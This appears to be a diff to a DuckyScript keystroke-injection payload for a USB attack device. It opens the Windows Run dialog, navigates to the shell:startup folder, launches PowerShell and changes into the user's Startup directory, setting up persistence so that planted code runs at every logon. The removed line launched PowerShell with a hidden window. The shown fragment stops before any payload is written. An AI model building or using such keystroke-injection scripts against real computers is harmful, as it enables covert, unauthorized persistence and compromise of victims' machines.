@@ -1,6 +1,10 @@
 GUI r
 DELAY 100
-STRINGLN POWERSHELL.exe -window-hidden
+STRINGLN shell:startup
+DELAY 50
+ALT D
+DELAY 20
+STRINGLN POWERSHELL.exe 
 DELAY 100
 STRINGLN cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 DELAY 50
